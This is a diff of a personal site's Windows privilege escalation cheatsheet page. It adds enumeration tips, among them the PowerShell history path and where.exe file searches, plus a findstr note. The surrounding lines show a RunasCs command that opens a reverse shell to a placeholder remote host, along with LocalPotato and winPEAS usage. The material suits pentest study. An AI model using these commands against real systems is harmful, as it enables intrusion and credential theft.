@@ -60,13 +60,13 @@
  
 
 <meta name="author" content="Jack69" />
-<meta name="description" content="Generic Enumeration Run automated checks with various tools: # Seatbelt .\Seatbelt.exe all .\Seatbelt.exe &lt;specific check&gt; # winPeas - there are also the PowerShell and BAT version reg add HKCU\Console /v VirtualTerminalLevel /t REG_DWORD /d 1 # Enables colors in terminal - not needed when running winPeas in a reverse shell .\winPEASany.exe …" />
+<meta name="description" content="Generic Enumeration Powershell history location: C:\Windows\system32\config\systemprofile\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt Find interesting files by extension: where.exe /r &lt;base dir&gt; *.ps1 where.exe /r &lt;base dir&gt; .git where.exe /r &lt;base dir&gt; *.bat Note: an interesting base dir could be c:\windows …" />
 <meta name="keywords" content="">
 
 
   <meta property="og:site_name" content="Jack's Corner"/>
   <meta property="og:title" content="Windows Privilege Escalation Cheatsheet"/>
-  <meta property="og:description" content="Generic Enumeration Run automated checks with various tools: # Seatbelt .\Seatbelt.exe all .\Seatbelt.exe &lt;specific check&gt; # winPeas - there are also the PowerShell and BAT version reg add HKCU\Console /v VirtualTerminalLevel /t REG_DWORD /d 1 # Enables colors in terminal - not needed when running winPeas in a reverse shell .\winPEASany.exe …"/>
+  <meta property="og:description" content="Generic Enumeration Powershell history location: C:\Windows\system32\config\systemprofile\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt Find interesting files by extension: where.exe /r &lt;base dir&gt; *.ps1 where.exe /r &lt;base dir&gt; .git where.exe /r &lt;base dir&gt; *.bat Note: an interesting base dir could be c:\windows …"/>
   <meta property="og:locale" content="en_US"/>
   <meta property="og:url" content="https://ojack69.github.io/jacks-corner/privilege-escalation/windows-privilege-escalation-cheatsheet.html"/>
   <meta property="og:type" content="article"/>
@@ -144,6 +144,15 @@
             <div id="toc"><ul><li><a class="toc-href" href="#generic-enumeration" title="Generic Enumeration">Generic Enumeration</a></li><li><a class="toc-href" href="#kernel-exploits" title="Kernel Exploits">Kernel Exploits</a></li><li><a class="toc-href" href="#service-and-tasks-exploits" title="Service and Tasks Exploits">Service and Tasks Exploits</a></li><li><a class="toc-href" href="#registry-exploits" title="Registry Exploits">Registry Exploits</a></li><li><a class="toc-href" href="#dumping-credentials" title="Dumping Credentials">Dumping Credentials</a></li><li><a class="toc-href" href="#applications-exploits" title="Applications Exploits">Applications Exploits</a></li><li><a class="toc-href" href="#potatoes" title="Potatoes">Potatoes</a></li><li><a class="toc-href" href="#misc" title="Misc">Misc</a><ul><li><a class="toc-href" href="#efs-encryption" title="EFS Encryption">EFS Encryption</a></li></ul></li></ul></div>
         </div>
     <h2 id="generic-enumeration">Generic Enumeration</h2>
+<p>Powershell history location:</p>
+<div class="highlight"><pre><span></span><code>C:\Windows\system32\config\systemprofile\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
+</code></pre></div>
+<p>Find interesting files by extension:</p>
+<div class="highlight"><pre><span></span><code>where.exe /r &lt;base dir&gt; <span class="gs">*.ps1</span>
+<span class="gs">where.exe /r &lt;base dir&gt; .git</span>
+<span class="gs">where.exe /r &lt;base dir&gt; *</span>.bat
+</code></pre></div>
+<p>Note: an interesting base dir could be <code>c:\windows</code>.</p>
 <p>Run automated checks with various tools:</p>
 <div class="highlight"><pre><span></span><code><span class="c"># Seatbelt</span>
 <span class="p">.\</span><span class="n">Seatbelt</span><span class="p">.</span><span class="n">exe</span> <span class="n">all</span>
@@ -444,6 +453,13 @@ LocalPotato.exe -r 127.0.0.1 -u /webdavshare/potato.local
 </code></pre></div>
 <p>Open reverse shell with <code>RunasCs</code>:</p>
 <div class="highlight"><pre><span></span><code>RunasCs.exe<span class="w"> </span>&lt;user&gt;<span class="w"> </span>&lt;password&gt;<span class="w"> </span>cmd.exe<span class="w"> </span>-r<span class="w"> </span>&lt;remote<span class="w"> </span>host&gt;:&lt;remote<span class="w"> </span>port&gt;
+</code></pre></div>
+<p>Window's <code>grep</code> equivalent (<a href="https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-xp/bb490907(v=technet.10)?redirectedfrom=MSDN">findstr</a>):</p>
+<div class="highlight"><pre><span></span><code><span class="p">#</span><span class="w"> </span><span class="n">grep</span><span class="w"> </span><span class="o">-</span><span class="n">E</span><span class="w"> </span><span class="o">&lt;</span><span class="n">regex</span><span class="o">&gt;</span>
+<span class="n">findstr</span><span class="w"> </span><span class="o">/</span><span class="n">r</span><span class="w"> </span><span class="o">&lt;</span><span class="n">regex</span><span class="o">&gt;</span>
+
+<span class="p">#</span><span class="w"> </span><span class="n">grep</span><span class="w"> </span><span class="o">-</span><span class="n">v</span><span class="w"> </span><span class="o">&lt;</span><span class="n">expression</span><span class="o">&gt;</span>
+<span class="n">findstr</span><span class="w"> </span><span class="o">/</span><span class="n">v</span><span class="w"> </span><span class="o">&lt;</span><span class="n">expression</span><span class="o">&gt;</span>
 </code></pre></div>
 <h3 id="efs-encryption">EFS Encryption</h3>
 <p>See <a href="https://ojack69.github.io/jacks-corner/privilege-escalation/windows-privilege-escalation.html#efs-encryption">Windows Privilege Escalation - EFS Encryption</a>.</p>
